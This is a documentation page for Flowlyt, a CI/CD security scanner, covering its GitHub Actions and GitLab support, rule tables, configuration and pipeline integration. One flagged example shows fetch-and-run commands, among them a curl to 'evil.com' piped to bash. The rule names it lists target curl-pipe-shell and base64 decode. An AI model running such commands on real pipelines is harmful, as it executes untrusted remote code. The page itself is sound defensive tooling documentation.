# Multi-Platform Support

Flowlyt provides comprehensive support for multiple CI/CD platforms, enabling you to maintain consistent security across your entire DevOps ecosystem.

## Supported Platforms

### GitHub Actions ✅

GitHub Actions is the default platform and receives the most comprehensive support.

**Features:**
- Complete workflow parsing (`.github/workflows/*.yml`)
- Action-specific security rules
- GitHub-specific permission analysis
- Pull request trigger security
- GitHub token and secret detection

**Usage:**
```bash
# Default - auto-detects GitHub Actions
flowlyt --repo ./github-project

# Explicit GitHub platform
flowlyt --platform github --repo ./github-project

# Remote GitHub repository
flowlyt --url https://github.com/user/repository

# Specific workflow file
flowlyt --workflow .github/workflows/ci.yml
```

### GitLab CI/CD ✅

Full support for GitLab CI/CD pipelines, both GitLab.com and on-premise instances.

**Features:**
- Complete `.gitlab-ci.yml` parsing
- GitLab-specific rule adaptations
- Multi-stage pipeline analysis
- GitLab variable and secret detection
- Custom GitLab instance support

**Usage:**
```bash
# GitLab.com repository
flowlyt --platform gitlab --repo ./gitlab-project

# On-premise GitLab instance
flowlyt --platform gitlab \
        --gitlab-instance https://gitlab.company.com \
        --repo ./project

# Remote GitLab repository
flowlyt --platform gitlab --url https://gitlab.com/user/repository

# Specific GitLab CI file
flowlyt --platform gitlab --workflow .gitlab-ci.yml
```

### Jenkins 🚧 (Planned)

Support for Jenkins pipelines is in development.

**Planned Features:**
- Jenkinsfile parsing
- Jenkins-specific security rules
- Plugin vulnerability detection

### Azure DevOps 🚧 (Planned)

Azure Pipelines support is on the roadmap.

**Planned Features:**
- Azure Pipelines YAML parsing
- Azure-specific security rules
- Azure DevOps integration

## Platform Detection

Flowlyt can automatically detect the CI/CD platform based on repository structure:

### Automatic Detection

```bash
# Auto-detects based on files present
flowlyt --repo ./project

# Detection priority:
# 1. .github/workflows/ → GitHub Actions
# 2. .gitlab-ci.yml → GitLab CI/CD
# 3. Jenkinsfile → Jenkins (planned)
# 4. azure-pipelines.yml → Azure DevOps (planned)
```

### Manual Override

```bash
# Force specific platform
flowlyt --platform github --repo ./project
flowlyt --platform gitlab --repo ./project
```

## Platform-Specific Features

### GitHub Actions Specific

#### Workflow Triggers
```yaml
# Flowlyt detects dangerous trigger patterns
on:
  pull_request_target:  # ⚠️ HIGH RISK
    types: [opened, synchronize]
```

#### Action Pinning
```yaml
# Flowlyt checks for unpinned actions
steps:
  - uses: actions/checkout@v4        # ⚠️ MEDIUM - version tag
  - uses: actions/checkout@abc123    # ✅ GOOD - commit SHA
```

#### GitHub Permissions
```yaml
# Flowlyt analyzes permission scope
permissions:
  contents: write     # ⚠️ Reviewed for necessity
  id-token: write    # ⚠️ OIDC token access
  packages: read     # ✅ Minimal access
```

### GitLab CI/CD Specific

#### Variable Security
```yaml
# Flowlyt detects exposed variables
variables:
  API_KEY: "sk-1234567890"  # ⚠️ CRITICAL - hardcoded secret
  DEBUG: "true"             # ✅ Safe variable
```

#### Image Security
```yaml
# Flowlyt checks container images
image: ubuntu:latest        # ⚠️ MEDIUM - unpinned image
# vs
image: ubuntu:20.04@sha256:...  # ✅ GOOD - pinned with digest
```

#### Pipeline Security
```yaml
# Flowlyt analyzes script content
script:
  - curl -s https://evil.com/script.sh | bash  # ⚠️ CRITICAL
  - wget -O - https://install.sh | sh          # ⚠️ CRITICAL
```

## Cross-Platform Rules

Many security rules apply across all platforms:

### Universal Security Rules

| Rule | GitHub Actions | GitLab CI/CD | Description |
|------|----------------|--------------|-------------|
| `HARDCODED_SECRET` | ✅ | ✅ | Detects hardcoded secrets and tokens |
| `MALICIOUS_BASE64_DECODE` | ✅ | ✅ | Identifies base64 decode patterns |
| `DANGEROUS_COMMAND` | ✅ | ✅ | Finds risky shell commands |
| `SHELL_EVAL_USAGE` | ✅ | ✅ | Detects eval usage in scripts |
| `CURL_PIPE_BASH` | ✅ | ✅ | Identifies curl pipe to shell |

### Platform-Specific Rules

| Rule | Platform | Description |
|------|----------|-------------|
| `UNPINNED_ACTION` | GitHub Actions | Detects unpinned GitHub Actions |
| `INSECURE_PULL_REQUEST_TARGET` | GitHub Actions | Dangerous PR trigger usage |
| `BROAD_PERMISSIONS` | GitHub Actions | Overly broad workflow permissions |
| `GITLAB_UNPINNED_IMAGE` | GitLab CI/CD | Unpinned container images |
| `GITLAB_DANGEROUS_ARTIFACTS` | GitLab CI/CD | Risky artifact configurations |

## Configuration for Multiple Platforms

### Platform-Specific Configuration

```yaml
# .flowlyt.yml
version: "1"

# Platform-specific rule configuration
platforms:
  github:
    rules:
      enabled:
        - "UNPINNED_ACTION"
        - "INSECURE_PULL_REQUEST_TARGET"
      disabled:
        - "CONTINUE_ON_ERROR_CRITICAL_JOB"  # Allow in GitHub
  
  gitlab:
    rules:
      enabled:
        - "GITLAB_UNPINNED_IMAGE"
        - "GITLAB_DANGEROUS_ARTIFACTS"
      disabled:
        - "UNPINNED_ACTION"  # Not applicable to GitLab

# Universal rules (apply to all platforms)
rules:
  enabled:
    - "HARDCODED_SECRET"
    - "MALICIOUS_BASE64_DECODE"
    - "DANGEROUS_COMMAND"
```

### Multi-Repository Scanning

```bash
# Scan multiple repositories with different platforms
for repo in github-repo gitlab-repo jenkins-repo; do
  echo "Scanning $repo..."
  flowlyt --repo ./repos/$repo --output json --output-file $repo-report.json
done
```

## Advanced Platform Features

### Custom Platform Rules

Create platform-specific custom rules:

```yaml
# Custom GitHub Actions rule
custom_rules:
  - id: "CUSTOM_GITHUB_SECURITY"
    name: "Custom GitHub Security Check"
    description: "Organization-specific GitHub Actions security"
    platform: "github"  # Only applies to GitHub Actions
    severity: "HIGH"
    pattern: "uses: .*company-internal.*"
    target:
      actions: true
    remediation: "Use approved internal actions only"

  - id: "CUSTOM_GITLAB_SECURITY"
    name: "Custom GitLab Security Check"
    description: "Organization-specific GitLab CI security"
    platform: "gitlab"  # Only applies to GitLab CI/CD
    severity: "HIGH"
    pattern: "image: .*internal-registry.*"
    target:
      commands: true
    remediation: "Use approved internal images only"
```

### Environment-Specific Scanning

```bash
# Production GitHub Actions
flowlyt --platform github \
        --repo ./prod-github-repo \
        --config .flowlyt.github.prod.yml

# Development GitLab CI/CD
flowlyt --platform gitlab \
        --repo ./dev-gitlab-repo \
        --config .flowlyt.gitlab.dev.yml
```

## Integration Examples

### GitHub Actions Integration

```yaml
# .github/workflows/security-scan.yml
name: Security Scan
on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Install Flowlyt
        run: GOPRIVATE=github.com/harekrishnarai/flowlyt go install github.com/harekrishnarai/flowlyt/cmd/flowlyt@latest
      - name: Run Security Scan
        run: |
          flowlyt --platform github \
                  --repo . \
                  --output json \
                  --output-file security-report.json
      - name: Upload Results
        uses: actions/upload-artifact@v4
        with:
          name: security-report
          path: security-report.json
```

### GitLab CI/CD Integration

```yaml
# .gitlab-ci.yml
stages:
  - security

security_scan:
  stage: security
  image: golang:latest
  script:
    - GOPRIVATE=github.com/harekrishnarai/flowlyt go install github.com/harekrishnarai/flowlyt/cmd/flowlyt@latest
    - flowlyt --platform gitlab --repo . --output json --output-file security-report.json
  artifacts:
    reports:
      junit: security-report.json
    paths:
      - security-report.json
  rules:
    - if: $CI_COMMIT_BRANCH == "main"
    - if: $CI_MERGE_REQUEST_ID
```

## Migration Between Platforms

### GitHub Actions to GitLab CI/CD

When migrating workflows between platforms, Flowlyt helps identify platform-specific security concerns:

```bash
# Scan original GitHub workflow
flowlyt --platform github --workflow .github/workflows/ci.yml --output json > github-analysis.json

# Scan migrated GitLab pipeline
flowlyt --platform gitlab --workflow .gitlab-ci.yml --output json > gitlab-analysis.json

# Compare security findings
diff github-analysis.json gitlab-analysis.json
```

## Best Practices

### 1. Platform-Specific Configurations
Maintain separate configuration files for different platforms:
```
.flowlyt.github.yml    # GitHub Actions specific
.flowlyt.gitlab.yml    # GitLab CI/CD specific  
.flowlyt.common.yml    # Shared rules
```

### 2. Consistent Security Standards
Use Flowlyt to maintain consistent security standards across platforms:
```bash
# Ensure all platforms meet minimum security bar
flowlyt --platform github --min-severity HIGH --repo ./github-project
flowlyt --platform gitlab --min-severity HIGH --repo ./gitlab-project
```

### 3. Platform Migration Validation
When migrating between platforms, use Flowlyt to ensure security doesn't regress:
```bash
# Before migration
flowlyt --platform github --repo ./project --output json > before.json

# After migration  
flowlyt --platform gitlab --repo ./project --output json > after.json

# Ensure no new HIGH/CRITICAL issues
```

---

**Next:** [Command Line Interface](cli-reference.md)
